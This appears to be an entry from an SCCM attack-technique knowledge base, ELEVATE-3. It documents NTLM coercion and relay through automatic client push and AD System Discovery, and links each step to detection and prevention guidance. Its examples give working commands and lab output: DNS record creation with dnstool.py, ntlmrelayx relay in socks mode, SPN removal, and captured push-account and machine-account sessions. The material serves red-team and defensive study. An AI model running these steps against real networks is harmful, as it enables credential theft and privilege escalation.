# ELEVATE-3

## Description
Coerce NTLM relay via automatic client push installation and AD System Discovery

## MITRE ATT&CK Tactics
- [TA0008](https://attack.mitre.org/tactics/TA0008) - Lateral Movement
- [TA0004](https://attack.mitre.org/tactics/TA0004) - Privilege Escalation

## Requirements

### Coercion
- Valid Active Directory domain credentials
- Ability to create/join computer account within AD domain.
- Ability to create a DNS A record
- Connectivity from the primary site server to SMB (TCP/445) on the relay server
- Primary site server settings:
    - Automatic site-wide client push installation is enabled
    - Automatic site assignment is enabled
    - AD System Discovery is enabled with newly created computer accounts within search path or below if search resursive child objects is enabled.
    - `Allow connection fallback to NTLM` is enabled for client push installation or Hotfix KB15599094 is missing on older SCCM deployments
    - `BlockNTLM` = `0` or not present, or = `1` and `BlockNTLMServerExceptionList` contains attacker relay server
    - `RestrictSendingNTLMTraffic` = `0`, `1`, or not present, or = `2` and `ClientAllowedNTLMServers` contains attacker relay server
    - Domain computer account is not in `Protected Users`
- Domain controller settings:
    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains coercion target

### Relay
- Relay target settings:
    - Connectivity from the relay server to SMB (TCP/445) on the relay target
    - `RequireSecuritySignature` = `0` or not present
    - `RestrictReceivingNTLMTraffic` = `0` or not present
    - Coercion target is local admin (to access RPC/admin shares)
- Domain controller settings:
    - `RestrictNTLMInDomain` = `0` or not present, or is configured with any value and `DCAllowedNTLMServers` contains relay target
    - `LmCompatibilityLevel` < `5` or not present, or = `5` and LmCompatibilityLevel >= `3` on the coercion target

## Summary
When SCCM automatic site assignment, automatic client push installation, and AD System Discovery are enabled, and newly created computer accounts are within the system discovery search path, it’s possible to coerce NTLM authentication from the site server's installation and machine accounts to an arbitrary NetBIOS name, FQDN, or IP address, allowing the credentials to be relayed or cracked. This can be done using a low-privileged domain account if the default configuration is present which allows every domain user to create DNS records and join up to 10 computer accounts to AD.

## Impact
Client push installation accounts require local admin privileges to install software on systems in an SCCM site, so it is often possible to relay the credentials and execute actions in the context of a local admin on other SCCM clients in the site. Many organizations use a member of highly privileged groups such as "Domain Admins" for client push installation for the sake of convenience.

If all configured accounts fail when the site server tries to authenticate to a system to install the client, or if no specific installation accounts are configured, the server tries to authenticate with its domain computer account. If SMB is used, [TAKEOVER-1](../../TAKEOVER/TAKEOVER-1/takeover-1_description.md) and [TAKEOVER-2](../../TAKEOVER/TAKEOVER-2/takeover-2_description.md) may be possible. If further AD misconfigurations are present allowing downgrade to NTLMv1, this may allow relay to LDAP to conduct attacks such as Shadow Credentials, Resource-based Constrained Delegation. If the AD CS ESC8 vulnerability is present in the environment, this can be used to take over the server ([TAKEOVER-3](../../TAKEOVER/TAKEOVER-3) or [TAKEOVER-4](../../TAKEOVER/TAKEOVER-8/)).

## Defensive IDs
- [DETECT-1: Monitor site server domain computer accounts authenticating from another source](../../../defense-techniques/DETECT/DETECT-1/detect-1_description.md)
- [DETECT-3: Monitor client push installation accounts authenticating from anywhere other than the primary site server](../../../defense-techniques/DETECT/DETECT-3/detect-3_description.md)
- [PREVENT-1: Patch site server with KB15599094](../../../defense-techniques/PREVENT/PREVENT-1/prevent-1_description.md)
- [PREVENT-2: Disable Fallback to NTLM](../../../defense-techniques/PREVENT/PREVENT-2/prevent-2_description.md)
- [PREVENT-5: Disable automatic side-wide client push installation](../../../defense-techniques/PREVENT/PREVENT-5/prevent-5_description.md)
- [PREVENT-12: Require SMB signing on site systems](../../../defense-techniques/PREVENT/PREVENT-12/prevent-12_description.md)

## Examples
It is not possible to identify whether automatic site-wide client push installation, automatic site assignment, AD System Discovery and `Allow connection fallback to NTLM` are enabled without attempting this attack.

1. On the attacker relay server, using dnstool.py, create a DNS A record for an not yet existent computer.

    ```
    $ python3 dnstool.py -u 'sevenkingdoms.local\low_priv' -p <REDACTED PASSWORD> -r marlboro.sevenkingdoms.local -a add -t A -d 10.2.10.249 10.2.10.10
    [-] Connecting to host...
    [-] Binding to host
    [+] Bind OK
    [-] Adding new record
    [+] LDAP operation completed successfully
    ```

2. Use ntlmrelayx to either point at a list of servers without SMB signing, AD CS Web enrollment or another SCCM site server without smb signing depending on goals. If ntlmv1 is in use within AD, it may be possible to relay to LDAPS and execute RBCD or shadow credential based attacks.

    ```
    # python3 examples/ntlmrelayx.py -tf ~/no_signing -smb2support -socks
    Impacket v0.12.0.dev1+20240320.191945.7e25245e - Copyright 2023 Fortra

    [*] Protocol Client HTTPS loaded..
    [*] Protocol Client MSSQL loaded..
    [*] Protocol Client SMTP loaded..
    [*] Protocol Client IMAP loaded..
    [*] Protocol Client HTTP loaded..
    [*] Protocol Client IMAPS loaded..
    [*] Protocol Client SMB loaded..
    [*] Protocol Client RPC loaded..
    [*] Protocol Client DCSYNC loaded..
    [*] Protocol Client LDAP loaded..
    [*] Protocol Client LDAPS loaded..
    [*] Running in relay mode to hosts in targetfile
    [*] SOCKS proxy started. Listening on 127.0.0.1:1080
    [*] SMB Socks Plugin loaded..
    [*] IMAPS Socks Plugin loaded..
    [*] MSSQL Socks Plugin loaded..
    [*] HTTP Socks Plugin loaded..
    [*] HTTPS Socks Plugin loaded..
    [*] IMAP Socks Plugin loaded..
    [*] SMTP Socks Plugin loaded..
    [*] Setting up SMB Server
    [*] Setting up HTTP Server on port 80
    * Serving Flask app 'impacket.examples.ntlmrelayx.servers.socksserver'
    * Debug mode: off
    [*] Setting up WCF Server
    [*] Setting up RAW Server on port 6666

    [*] Servers started, waiting for connections
    Type help for list of commands
    ```
3. Join a windows machine to the domain by doing the following:
   - Navigate to Control Panel then "System and Security"
   - Select "See the name of this computer"
   - Select "Rename this PC (Advanced)
   - Click "Change" to rename this computer or change its domain or Workgroup
   - change the domain of your Windows PC to your target domain and change the computer name to what you desire.
   - Enter credentials when prompted and restart when prompted.
4. After restarting, the computer, sign in with the user you joined the computer to the domain with and use setspn.exe to remove the host SPN's for the machine account
   ```
   setspn -D host/malboro marlboro
   setspn -D host/marlboro.sevenkingdoms.local marlboro
   ```
5. After a few minutes (in a default configuration an "delta discovery" takes place every 5 minutes. shortly after authentication attempts should happen.), ntlmrelayx should receive a connection from the configured client push installation account(s) and the site server’s machine account:
    ```
    [*] Authenticating against smb://10.2.10.113 as SEVENKINGDOMS/SCCM_PUSH SUCCEEDED
    [*] SOCKS: Adding SEVENKINGDOMS/SCCM_PUSH@10.2.10.113(445) to active SOCKS connection Enjoy 
    [*] Authenticating against smb://10.2.10.15 as SEVENKINGDOMS/SCCM01$ SUCCEED
    [*] SOCKS: Adding SEVENKINGDOMS/SCCM01$@10.2.10.15(445) to active SOCKS connection. Enjoy
    socks
    Protocol  Target       Username                 AdminStatus  Port
    --------  -----------  -----------------------  -----------  ----
    SMB       10.2.10.15   SEVENKINGDOMS/SCCM_PUSH  FALSE        445
    SMB       10.2.10.15   SEVENKINGDOMS/SCCM01$    FALSE        445
    SMB       10.2.10.22   SEVENKINGDOMS/SCCM_PUSH  TRUE         445
    SMB       10.2.10.22   SEVENKINGDOMS/SCCM01$    FALSE        445
    SMB       10.2.10.23   SEVENKINGDOMS/SCCM_PUSH  FALSE        445
    SMB       10.2.10.23   SEVENKINGDOMS/SCCM01$    FALSE        445
    SMB       10.2.10.113  SEVENKINGDOMS/SCCM_PUSH  TRUE         445
    SMB       10.2.10.113  SEVENKINGDOMS/SCCM01$    FALSE        445
    ```
### Cleanup
#### AD Computer Account cleanup
Prior to cleaning up the DDR from SCCM, its important to delete the computer account from Active Directory, otherwise, during the next full poll, the computer account may be re-discovered and a corresponding DDR may be recreated resulting in further authentication attempts. This will require administrative privileges within the domain.
```
addcomputer.py -computer-name 'COMPUTER$' -dc-host $DomainController -delete 'DOMAIN\user:password'
```
It is not possible to remotely delete device records or remove CCRs in the retry queue that are created by System Discovery generated DDRs without having `Full Administrator` privileges to SCCM. By default, the site will retry client push installation every 60 minutes for 7 days, and if a newly discovered device sits in the client push installation retry queue for more than 24 hours, an error message may be displayed in the console to administrators.

With `Full Administrator` access to SCCM, artifacts can be removed from the site server and database through the ConfigMgr console or using SharpSCCM.

The following command can be used to identify the device's ResourceId:

```
SharpSCCM.exe get devices -sms <SMS_PROVIDER> -sc <SITECODE> -n <NTLMRELAYX_LISTENER_IP> -p "Name" -p "ResourceId" -p "SMSUniqueIdentifier"

[+] Connecting to \\<SMS_PROVIDER>\root\SMS\site_<SITECODE>
[+] Executing WQL query: SELECT ResourceId,Name,SMSUniqueIdentifier FROM SMS_R_System WHERE Name LIKE '%<NTLMRELAYX_LISTENER_IP>%'
-----------------------------------
SMS_R_System
-----------------------------------
Name: <NTLMRELAYX_LISTENER_IP>
ResourceId: 16777236
SMSUniqueIdentifier: GUID:593FA39D-B6C6-4B8F-A4DE-2454503116FC
-----------------------------------
Name: <NTLMRELAYX_LISTENER_IP>
ResourceId: 16777237
SMSUniqueIdentifier: GUID:257EC4DF-C376-43A9-BAD1-D4AA25B48A2C
-----------------------------------
```

The following command can be used to remove a device with a specified GUID:

```
SharpSCCM.exe remove device GUID:<GUID> -sms <SMS_PROVIDER> -sc <SITECODE>

[+] Connecting to \\<SMS_PROVIDER>\root\SMS\site_<SITECODE>
[+] Deleted device with SMSUniqueIdentifier GUID:257EC4DF-C376-43A9-BAD1-D4AA25B48A2C
[+] Completed execution in 00:00:01.8554465
```

## References
- Chris Thompson, [Coercing NTLM Authentication from SCCM Servers](https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a)
- Chris Thompson, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM)
- Marshall Price, [SCCM Exploitation: Account Compromise Through Automatic Client Push & AD System Discovery](https://www.guidepointsecurity.com/blog/sccm-exploitation-account-compromise-through-automatic-client-push-amp-ad-system-discovery/)
